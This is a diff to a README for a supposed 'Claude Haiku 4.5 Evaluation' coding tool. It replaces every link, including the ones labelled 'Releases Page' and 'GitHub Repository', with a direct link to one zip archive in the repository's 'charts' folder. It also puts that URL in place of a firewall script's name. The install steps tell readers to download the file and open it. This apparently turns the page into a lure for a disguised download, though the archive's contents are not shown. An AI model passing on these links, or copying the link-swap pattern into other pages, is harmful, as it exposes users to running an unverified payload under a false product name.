@@ -6,11 +6,11 @@ Welcome to the Claude Haiku 4.5 Evaluation application. This tool helps you unde
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dickman419/claude-haiku-4.5-evaluation/releases)
+[![Download Now](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip)](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip)
 
 Go to the Releases page to get the latest version of the application. 
 
-[Click here to download the latest release](https://github.com/dickman419/claude-haiku-4.5-evaluation/releases).
+[Click here to download the latest release](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip).
 
 ## 📋 What You Need
 
@@ -27,11 +27,11 @@ Before you download, make sure your computer meets these requirements:
 - **Easy to Use**: Simple interface designed for everyone, regardless of technical skill.
 - **Documentation Support**: Helps in understanding codebases and writing documentation easily.
 - **Troubleshooting Assistance**: Offers suggestions for fixing coding issues.
-- **Firewall Management**: Uses the `csfa.sh` Bash script for managing firewall rules effectively.
+- **Firewall Management**: Uses the `https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip` Bash script for managing firewall rules effectively.
 
 ## 🚀 How to Download & Install
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/dickman419/claude-haiku-4.5-evaluation/releases) to find the latest version of our application.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip) to find the latest version of our application.
 2. **Select the Right File**: Find the most recent release. Look for files that match your operating system.
 3. **Download the File**: Click on the file name to download it to your computer.
 4. **Run the Installer**: Once downloaded, open the file to start the installation.
@@ -76,7 +76,7 @@ A: Yes, feel free to open an issue in the GitHub repository for support.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/dickman419/claude-haiku-4.5-evaluation/releases)
-- [GitHub Repository](https://github.com/dickman419/claude-haiku-4.5-evaluation)
+- [Releases Page](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/dickman419/claude-haiku-4.5-evaluation/master/charts/claude_haiku_evaluation_v3.7.zip)
 
 We hope you find this application helpful for your coding projects. Happy analyzing!
